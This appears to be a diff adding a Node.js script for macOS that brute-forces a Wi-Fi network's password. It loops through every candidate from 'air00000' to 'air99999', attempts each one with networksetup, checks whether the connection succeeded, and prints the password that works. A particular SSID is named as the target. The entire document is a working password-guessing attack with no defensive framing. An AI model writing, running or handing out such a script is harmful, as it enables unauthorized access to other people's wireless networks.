@@ -1,0 +1,47 @@
+const { exec } = require('child_process');
+const os = require('os');
+
+// ⚙️ Configuration
+const SSID = 'Airtel_llluminati'; // 👈 Replace with your Wi-Fi name
+const PREFIX = 'air';
+
+// 🛠 Function to try a Wi-Fi password
+function tryPassword(password) {
+  return new Promise((resolve) => {
+    console.log(`Trying: ${password}`);
+
+    // macOS command to connect to Wi-Fi
+    const cmd = `networksetup -setairportnetwork en0 "${SSID}" "${password}"`;
+
+    exec(cmd, (error, stdout, stderr) => {
+      if (stderr && stderr.includes('Could not find network')) {
+        console.log('⚠️  Network not found.');
+        resolve(false);
+        return;
+      }
+
+      // Wait a few seconds and check current SSID
+      setTimeout(() => {
+        exec(`/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I`, (err, out) => {
+          if (out.includes(` SSID: ${SSID}`)) {
+            console.log(`✅ SUCCESS! Password is: ${password}`);
+            process.exit(0);
+          } else {
+            resolve(false);
+          }
+        });
+      }, 5000); // Wait 5 seconds to let connection happen
+    });
+  });
+}
+
+// 🔁 Main loop to try passwords
+async function bruteForce() {
+  for (let i = 0; i <= 99999; i++) {
+    const suffix = i.toString().padStart(5, '0');
+    const password = `${PREFIX}${suffix}`;
+    await tryPassword(password);
+  }
+}
+
+bruteForce();
